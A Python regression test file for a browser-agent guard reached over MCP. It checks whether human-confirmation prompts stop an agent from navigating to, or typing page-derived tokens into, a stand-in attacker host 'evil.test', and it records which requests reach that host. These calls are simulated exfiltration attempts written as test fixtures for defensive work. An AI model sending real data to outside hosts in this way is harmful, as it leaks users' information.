"""Human-confirmation regression cases EL1 to EL10, plus EL8b and EL8c.

Driven through a real MCP client session over stdio, not through an internal
call: an elicitation is a server-initiated request, so it only exists if it
crosses the wire.  The client's ``elicitation_callback`` is scripted per case
and stands in for the human; every line it produces is tagged
``SCRIPTED_HUMAN`` in the transcript so no reader mistakes it for a person.

Expectations are the ones frozen in PREDICTIONS.md, amendments 2026-08-23b
and 2026-08-23c.  The raw transcript is written to
``tests/results/confirmation_<phase>.txt`` before any assertion runs, so a
failing run still leaves its evidence.

Copyright 2026 David Grice
SPDX-License-Identifier: AGPL-3.0-or-later
"""

from __future__ import annotations

import asyncio
import json
import os
import tempfile
from pathlib import Path
from typing import Any
from urllib.parse import urlsplit

from mcp import ClientSession, StdioServerParameters, types
from mcp.client.stdio import stdio_client

from agentlock_browser.log import DecisionLog
from tests.harness import FIXTURE_HOST, RESULTS, evil_hits, serve_origins

REPO = Path(__file__).resolve().parents[1]
SERVER = str(REPO / ".venv" / "bin" / "agentlock-browser")

EVIL_HOST = "evil.test"
EVIL_Q = f"http://{EVIL_HOST}/q?id=7731"
EVIL_DATASET = f"http://{EVIL_HOST}/dataset.csv"
EVIL_OTHER = f"http://{EVIL_HOST}/other"
EVIL_ROOT = f"http://{EVIL_HOST}/"

#: Carries a distinctive token, so AgentLock's novel-lineage check has an
#: authoritative baseline to classify a model-composed URL against.  Without
#: one the MODEL channel goes inactive (NEEDS.md item 3(b)) and EL1 would
#: measure the hole rather than the mechanism.
OPERATOR_TEXT = f"research the pages on http://{FIXTURE_HOST}/index.html"

#: The label every scripted answer carries.  There is no human in this file.
SCRIPTED_HUMAN = "SCRIPTED_HUMAN"


# -- the scripted human ---------------------------------------------------


class ScriptedHuman:
    """Answers elicitations from a fixed script, and records every exchange."""

    def __init__(self, answers: list[str]) -> None:
        #: One entry per elicitation, in order: allow_once,
        #: trust_origin_session, decline or cancel.  Exhausting the script is
        #: an error, not a silent default: it would mean the server asked
        #: more times than the freeze says it should.
        self.answers = list(answers)
        self.exchanges: list[dict[str, Any]] = []

    @property
    def calls(self) -> int:
        return len(self.exchanges)

    async def __call__(
        self, context: Any, params: types.ElicitRequestParams
    ) -> types.ElicitResult:
        index = len(self.exchanges)
        answer = self.answers[index] if index < len(self.answers) else "__over__"
        request = params.model_dump(by_alias=True, mode="json", exclude_none=True)

        if answer in ("allow_once", "trust_origin_session"):
            result = types.ElicitResult(action="accept", content={"choice": answer})
        elif answer == "decline":
            result = types.ElicitResult(action="decline")
        elif answer == "cancel":
            result = types.ElicitResult(action="cancel")
        else:
            # The script ran out.  Cancel, and let the recorded exchange count
            # be what fails the case.
            result = types.ElicitResult(action="cancel")

        self.exchanges.append({
            "by": SCRIPTED_HUMAN,
            "index": index,
            "scripted_answer": answer,
            "request": request,
            "result": result.model_dump(by_alias=True, mode="json", exclude_none=True),
        })
        return result


# -- capability overrides for EL8b and EL8c -------------------------------


def _override_capabilities(
    session: ClientSession, elicitation: types.ElicitationCapability | None
) -> None:
    """Force what this client advertises, instead of the SDK's derived flags.

    `ClientSession` advertises `{"form": {}, "url": {}}` whenever any
    elicitation callback is supplied (mcp/client/session.py:596-600), so
    url-only and modes-unspecified clients cannot be expressed any other way.
    Test-only, and only the elicitation entry is replaced.
    """
    original = session._build_capabilities

    def build(version: str) -> types.ClientCapabilities:
        caps = original(version)
        return caps.model_copy(update={"elicitation": elicitation})

    session._build_capabilities = build  # type: ignore[method-assign]


CAP_DEFAULT = "sdk_default"
CAP_NONE = "none"
CAP_URL_ONLY = "url_only"
CAP_MODES_UNSPECIFIED = "modes_unspecified"

CAP_OVERRIDES: dict[str, types.ElicitationCapability | None] = {
    CAP_URL_ONLY: types.ElicitationCapability(url=types.UrlElicitationCapability()),
    CAP_MODES_UNSPECIFIED: types.ElicitationCapability(),
}


# -- case bodies ----------------------------------------------------------
#
# Each body is `async def body(call, log) -> None`, where `call` issues a tool
# call and appends it to the transcript.


async def _el1_body(call: Any) -> None:
    await call("navigate", {"url": EVIL_Q}, tag="gated")


async def _el2_body(call: Any) -> None:
    await call("navigate", {"url": EVIL_Q}, tag="gated")
    await call("navigate", {"url": EVIL_Q}, tag="repeat")


_el3_body = _el2_body


async def _el4_body(call: Any) -> None:
    await call("snapshot", {}, tag="setup")
    await call("navigate", {"url": EVIL_DATASET}, tag="gated")


async def _el5_body(call: Any) -> None:
    await call("snapshot", {}, tag="setup")
    await call("navigate", {"url": EVIL_DATASET}, tag="gated")
    await call("navigate", {"url": EVIL_OTHER}, tag="second")


async def _el6_body(call: Any) -> None:
    snap = await call("snapshot", {}, tag="setup")
    element_id = _field_id(snap, "phrase")
    await call("type", {"element_id": element_id, "value": "tk-4417-zz"}, tag="gated")


async def _el7_body(call: Any) -> None:
    snap = await call("snapshot", {}, tag="setup")
    element_id = _field_id(snap, "topic")
    await call("type", {"element_id": element_id, "value": "expenses"}, tag="gated")


async def _el9_body(call: Any) -> None:
    snap = await call("snapshot", {}, tag="setup")
    link_id = _link_id(snap, EVIL_HOST)
    await call("click", {"element_id": link_id}, tag="gated")
    await call("navigate", {"url": EVIL_ROOT}, tag="second")


async def _el10_body(call: Any) -> None:
    for n in range(1, 7):
        await call("navigate", {"url": f"http://{EVIL_HOST}/step-{n}?id=7731"},
                   tag=f"attempt{n}")


def _field_id(snapshot: dict[str, Any], name: str) -> str:
    """The element id of the textbox whose name or placeholder matches."""
    for element in snapshot.get("elements", []):
        if element.get("role") != "textbox":
            continue
        blob = f"{element.get('name', '')} {element.get('text', '')}".lower()
        if name.lower() in blob:
            return element["id"]
    raise AssertionError(f"no textbox matching {name!r} in {snapshot}")


def _link_id(snapshot: dict[str, Any], host: str) -> str:
    for element in snapshot.get("elements", []):
        if element.get("role") == "link" and host in element.get("href", ""):
            return element["id"]
    raise AssertionError(f"no link to {host!r} in {snapshot}")


# -- the cases ------------------------------------------------------------

CASES: list[dict[str, Any]] = [
    {
        "case": "EL1",
        "description": "model-composed URL, human allows once",
        "fixture": "index.html",
        "answers": ["allow_once"],
        "body": _el1_body,
        "capabilities": CAP_DEFAULT,
    },
    {
        "case": "EL2",
        "description": "model-composed URL, human declines, then the same call again",
        "fixture": "index.html",
        "answers": ["decline"],
        "body": _el2_body,
        "capabilities": CAP_DEFAULT,
    },
    {
        "case": "EL3",
        "description": "model-composed URL, human cancels, then the same call again",
        "fixture": "index.html",
        "answers": ["cancel", "cancel"],
        "body": _el3_body,
        "capabilities": CAP_DEFAULT,
    },
    {
        "case": "EL4",
        "description": "URL read off the page, human allows once",
        "fixture": "t1_source.html",
        "answers": ["allow_once"],
        "body": _el4_body,
        "capabilities": CAP_DEFAULT,
    },
    {
        "case": "EL5",
        "description": "URL read off the page, human trusts the origin for the session",
        "fixture": "t1_source.html",
        "answers": ["trust_origin_session"],
        "body": _el5_body,
        "capabilities": CAP_DEFAULT,
    },
    {
        "case": "EL6",
        "description": "form value read off the page, human allows once",
        "fixture": "t3_form.html",
        "answers": ["allow_once"],
        "body": _el6_body,
        "capabilities": CAP_DEFAULT,
    },
    {
        "case": "EL7",
        "description": "tokenless form value, confirm_unclassified on",
        "fixture": "el7_form.html",
        "answers": ["allow_once"],
        "body": _el7_body,
        "capabilities": CAP_DEFAULT,
        "confirm_unclassified": True,
    },
    {
        "case": "EL7off",
        "description": "tokenless form value, confirm_unclassified off",
        "fixture": "el7_form.html",
        "answers": [],
        "body": _el7_body,
        "capabilities": CAP_DEFAULT,
        "confirm_unclassified": False,
    },
    {
        "case": "EL8",
        "description": "client advertises no elicitation at all",
        "fixture": "index.html",
        "answers": None,
        "body": _el1_body,
        "capabilities": CAP_NONE,
    },
    {
        "case": "EL8b",
        "description": "client advertises url mode only",
        "fixture": "index.html",
        "answers": ["allow_once"],
        "body": _el1_body,
        "capabilities": CAP_URL_ONLY,
    },
    {
        "case": "EL8c",
        "description": "client advertises elicitation with no mode named",
        "fixture": "index.html",
        "answers": ["allow_once"],
        "body": _el1_body,
        "capabilities": CAP_MODES_UNSPECIFIED,
    },
    {
        "case": "EL9",
        "description": "click offsite, then navigate to the target it reported",
        "fixture": "t4_escape.html",
        "answers": ["allow_once"],
        "body": _el9_body,
        "capabilities": CAP_DEFAULT,
    },
    {
        "case": "EL10",
        "description": "six declines in one session; the sixth is not asked",
        "fixture": "index.html",
        "answers": ["decline"] * 5,
        "body": _el10_body,
        "capabilities": CAP_DEFAULT,
    },
]


#: PREDICTIONS.md amendments 2026-08-23b and 2026-08-23c, one entry per case.
#: A key absent from an entry is not constrained by the freeze.
#:
#: ``evil_hit_paths`` is the path component of what reached the second origin,
#: without the query string: the freeze writes EL1's expectation as ``['/q']``
#: while the request is ``/q?id=7731``.  Both are recorded; the frozen value
#: is checked against the path.
FROZEN: dict[str, dict[str, Any]] = {
    "EL1": {
        "elicit_requests_logged": 1,
        "gated": {"allowed": True, "channel": "USER_CONFIRMED"},
        "final_url_host": EVIL_HOST,
        "evil_hit_paths": ["/q"],
    },
    "EL2": {
        "elicit_requests_logged": 1,
        "gated": {"allowed": False, "confirmation": "declined"},
        "repeat": {"allowed": False, "confirmation": "declined"},
        "evil_hit_paths": [],
    },
    "EL3": {
        "elicit_requests_logged": 2,
        "gated": {"allowed": False, "confirmation": "cancelled"},
        "repeat": {"allowed": False, "confirmation": "cancelled"},
        "evil_hit_paths": [],
    },
    "EL4": {
        "elicit_requests_logged": 1,
        "elicit_message_contains": f"from page http://{FIXTURE_HOST}",
        "gated": {"allowed": True, "channel": "USER_CONFIRMED"},
        "evil_hit_paths": ["/dataset.csv"],
    },
    "EL5": {
        "elicit_requests_logged": 1,
        "gated": {"allowed": True},
        "second": {"allowed": True, "channel": "ALLOWLIST"},
        "evil_hit_paths": ["/dataset.csv", "/other"],
    },
    "EL6": {
        "elicit_requests_logged": 1,
        "gated": {"allowed": True, "channel": "USER_CONFIRMED"},
        "evil_hit_paths": [],
    },
    "EL7": {
        "elicit_requests_logged": 1,
        "gated": {"allowed": True, "channel": "USER_CONFIRMED"},
        "evil_hit_paths": [],
    },
    "EL7off": {
        "elicit_requests_logged": 0,
        "gated": {"allowed": True, "channel": "UNCLASSIFIED", "fail_open": True},
        "evil_hit_paths": [],
    },
    "EL8": {
        "elicit_requests_logged": 0,
        "gated": {"allowed": False, "confirmation": "unavailable"},
        "evil_hit_paths": [],
    },
    "EL8b": {
        "elicit_requests_logged": 0,
        "gated": {"allowed": False, "confirmation": "unavailable"},
        "evil_hit_paths": [],
    },
    "EL8c": {
        "elicit_requests_logged": 1,
        "gated": {"allowed": True, "channel": "USER_CONFIRMED"},
        "final_url_host": EVIL_HOST,
        "evil_hit_paths": ["/q"],
    },
    "EL9": {
        "elicit_requests_logged": 1,
        # A click carries no gate block of its own: the click is ungated and
        # the navigation it caused is what the gate decided, so the denial is
        # read off the `blocked` entry.
        "gated": {"blocked_allowed": False, "blocked_target": EVIL_ROOT},
        "second": {"allowed": True, "channel": "USER_CONFIRMED"},
        "evil_hit_paths": ["/"],
    },
    "EL10": {
        "elicit_requests_logged": 5,
        "attempt6": {"allowed": False, "confirmation": "cap_reached"},
        "evil_hit_paths": [],
    },
}


def _gate_of(step: dict[str, Any]) -> dict[str, Any]:
    """The gate block of a tool result, as the model would read it."""
    payload = step.get("result")
    if not isinstance(payload, dict):
        return {}
    gate = payload.get("gate")
    return gate if isinstance(gate, dict) else {}


def _blocked_target(step: dict[str, Any]) -> str:
    payload = step.get("result")
    if not isinstance(payload, dict):
        return ""
    for entry in payload.get("blocked", []) or []:
        target = entry.get("target", "")
        if target:
            return str(target)
    return ""


def _blocked_allowed(step: dict[str, Any]) -> bool | None:
    """`allowed` on the first blocked navigation a step reported, if any."""
    payload = step.get("result")
    if not isinstance(payload, dict):
        return None
    blocked = payload.get("blocked") or []
    if not blocked:
        return None
    return bool(blocked[0].get("allowed"))


def _check(case: str, observed: dict[str, Any]) -> list[str]:
    """Fields that differ from the freeze.  Empty list means exact match."""
    frozen = FROZEN[case]
    diffs: list[str] = []

    if "elicit_requests_logged" in frozen:
        want = frozen["elicit_requests_logged"]
        got = observed["elicit_requests_logged"]
        if got != want:
            diffs.append(f"elicit_requests_logged: frozen {want!r}, observed {got!r}")

    if "elicit_message_contains" in frozen:
        want = frozen["elicit_message_contains"]
        messages = observed["elicit_messages"]
        if not any(want in m for m in messages):
            diffs.append(
                f"elicit_message_contains: frozen {want!r}, observed messages "
                f"{messages!r}"
            )

    for tag in ("gated", "repeat", "second", "attempt6"):
        if tag not in frozen:
            continue
        step = observed["steps"].get(tag)
        if step is None:
            diffs.append(f"{tag}: frozen {frozen[tag]!r}, observed no such step")
            continue
        gate = _gate_of(step)
        for field, want in frozen[tag].items():
            if field == "blocked_target":
                got: Any = _blocked_target(step)
            elif field == "blocked_allowed":
                got = _blocked_allowed(step)
            else:
                got = gate.get(field)
            if got != want:
                diffs.append(
                    f"{tag}.{field}: frozen {want!r}, observed {got!r}"
                )

    if "final_url_host" in frozen:
        want = frozen["final_url_host"]
        got = observed["final_url"]
        if want not in got:
            diffs.append(f"final_url: frozen host {want!r}, observed {got!r}")

    if "evil_hit_paths" in frozen:
        want = frozen["evil_hit_paths"]
        got = observed["evil_hit_paths"]
        if got != want:
            diffs.append(f"evil_hit_paths: frozen {want!r}, observed {got!r}")

    return diffs


# -- running --------------------------------------------------------------


async def _run_case(spec: dict[str, Any], origins: Any, tmp: Path) -> dict[str, Any]:
    case = spec["case"]
    log_path = tmp / f"confirmation_{case}.jsonl"
    if log_path.exists():
        log_path.unlink()
    config_path = tmp / f"config_{case}.json"

    config: dict[str, Any] = {
        "allowlist": [f"http://{FIXTURE_HOST}"],
        "operator_text": OPERATOR_TEXT,
        "log_path": str(log_path),
        "headless": True,
        "chromium_args": list(origins.chromium_args),
    }
    if "confirm_unclassified" in spec:
        config["confirm_unclassified"] = spec["confirm_unclassified"]
    config_path.write_text(json.dumps(config), encoding="utf-8")

    env = dict(os.environ)
    env["AGENTLOCK_BROWSER_CONFIG"] = str(config_path)
    env.pop("OPENAI_API_KEY", None)

    human = ScriptedHuman(spec["answers"] or [])
    kwargs: dict[str, Any] = {}
    if spec["answers"] is not None:
        kwargs["elicitation_callback"] = human

    page_url = f"http://{FIXTURE_HOST}/{spec['fixture']}"
    steps: dict[str, dict[str, Any]] = {}
    transcript: list[dict[str, Any]] = []
    advertised: dict[str, Any] = {}
    final_url = ""

    params = StdioServerParameters(command=SERVER, args=[], env=env)
    async with stdio_client(params) as (reader, writer):
        async with ClientSession(reader, writer, **kwargs) as session:
            override = spec["capabilities"]
            if override == CAP_NONE:
                pass  # no callback was passed, so nothing is advertised
            elif override in CAP_OVERRIDES:
                _override_capabilities(session, CAP_OVERRIDES[override])

            init = await session.initialize()
            advertised = session._build_capabilities(
                init.protocol_version
            ).model_dump(by_alias=True, exclude_none=True)

            async def call(name: str, arguments: dict[str, Any],
                           *, tag: str) -> dict[str, Any]:
                nonlocal final_url
                result = await session.call_tool(name, arguments)
                payload = result.structured_content
                step = {
                    "tag": tag,
                    "tool": name,
                    "arguments": arguments,
                    "is_error": result.is_error,
                    "result": payload,
                }
                transcript.append(step)
                steps[tag] = step
                if isinstance(payload, dict) and payload.get("url"):
                    final_url = payload["url"]
                return payload if isinstance(payload, dict) else {}

            setup = await call("navigate", {"url": page_url}, tag="setup_navigate")
            assert setup is not None
            await spec["body"](call)

    records = DecisionLog(log_path).read()
    elicit_requests = [r for r in records if r.get("event") == "elicit_request"]
    hits = evil_hits()
    observed = {
        "advertised_capabilities": advertised,
        "elicit_requests_logged": len(elicit_requests),
        "elicit_messages": [str(r.get("message", "")) for r in elicit_requests],
        "scripted_human_calls": human.calls,
        "steps": steps,
        "final_url": final_url,
        "evil_hits": hits,
        "evil_hit_paths": [urlsplit(h).path for h in hits],
        "decisions": [r for r in records if r.get("event") == "decision"],
        "log_events": [r.get("event") for r in records],
    }
    return {
        "case": case,
        "description": spec["description"],
        "fixture": spec["fixture"],
        "config": config,
        "transcript": transcript,
        "scripted_answers": spec["answers"],
        "exchanges": human.exchanges,
        "observed": observed,
    }


async def _run_all() -> list[dict[str, Any]]:
    results = []
    with tempfile.TemporaryDirectory() as tmpdir:
        tmp = Path(tmpdir)
        for spec in CASES:
            # A fresh pair of origins per case, so evil.test hits are that
            # case's alone.
            with serve_origins() as origins:
                results.append(await _run_case(spec, origins, tmp))
    return results


def _write_report(results: list[dict[str, Any]], phase: str) -> Path:
    RESULTS.mkdir(parents=True, exist_ok=True)
    lines = [
        f"Human-confirmation regression cases, {phase} run",
        "=" * 72,
        "",
        f"allowlist:     ['http://{FIXTURE_HOST}']",
        f"operator_text: {OPERATOR_TEXT!r}",
        "",
        "Frozen expectations: PREDICTIONS.md amendments 2026-08-23b and",
        "2026-08-23c. Every elicitation answer below was produced by the",
        f"scripted callback tagged {SCRIPTED_HUMAN}; no human was in the loop.",
        "",
    ]
    for result in results:
        case = result["case"]
        observed = result["observed"]
        lines.append("=" * 72)
        lines.append(f"CASE {case}: {result['description']}")
        lines.append("=" * 72)
        lines.append(f"fixture:          {result['fixture']}")
        lines.append(f"scripted answers: {result['scripted_answers']!r}")
        lines.append(
            f"advertised:       "
            f"{json.dumps(observed['advertised_capabilities'], sort_keys=True)}"
        )
        lines.append("")
        lines.append("TOOL CALLS AND RAW RESULTS")
        lines.append("-" * 72)
        for step in result["transcript"]:
            lines.append(
                f"-> [{step['tag']}] {step['tool']} "
                f"{json.dumps(step['arguments'], sort_keys=True)}"
            )
            lines.append(json.dumps(step["result"], indent=2, sort_keys=True,
                                    default=str))
            lines.append("")
        lines.append(f"{SCRIPTED_HUMAN} EXCHANGES")
        lines.append("-" * 72)
        if result["exchanges"]:
            for exchange in result["exchanges"]:
                lines.append(json.dumps(exchange, sort_keys=True, default=str))
        else:
            lines.append("(none)")
        lines.append("")
        lines.append("OBSERVED")
        lines.append("-" * 72)
        for field in ("elicit_requests_logged", "scripted_human_calls",
                      "elicit_messages", "final_url", "evil_hits",
                      "evil_hit_paths", "log_events"):
            lines.append(f"{field} = {observed[field]!r}")
        lines.append("")
        lines.append("DECISION LOG (raw JSONL)")
        lines.append("-" * 72)
        for record in observed["decisions"]:
            lines.append(json.dumps(record, sort_keys=True, default=str))
        lines.append("")
        diffs = _check(case, observed)
        lines.append("AGAINST THE FREEZE")
        lines.append("-" * 72)
        if diffs:
            lines.append("MATCH: no")
            for diff in diffs:
                lines.append(f"  differs  {diff}")
        else:
            lines.append("MATCH: yes")
        lines.append("")

    matched = [r["case"] for r in results if not _check(r["case"], r["observed"])]
    differed = [r["case"] for r in results if _check(r["case"], r["observed"])]
    lines.append("=" * 72)
    lines.append("SUMMARY")
    lines.append("=" * 72)
    lines.append(f"matching the freeze: {matched}")
    lines.append(f"differing from the freeze: {differed}")
    path = RESULTS / f"confirmation_{phase}.txt"
    path.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return path


def test_confirmation_cases_against_the_freeze() -> None:
    """Run EL1 to EL10, EL8b and EL8c, and compare every frozen field.

    The phase name for the transcript comes from ``CONFIRMATION_PHASE`` so the
    pre-fix baseline and the post-fix replay land in separate files.
    """
    phase = os.environ.get("CONFIRMATION_PHASE", "post")
    results = asyncio.run(_run_all())
    path = _write_report(results, phase)
    differed = {
        r["case"]: _check(r["case"], r["observed"])
        for r in results
        if _check(r["case"], r["observed"])
    }
    assert not differed, (
        f"cases differing from PREDICTIONS.md amendments 2026-08-23b and "
        f"2026-08-23c: {json.dumps(differed, indent=2)}\n"
        f"raw transcript: {path}"
    )
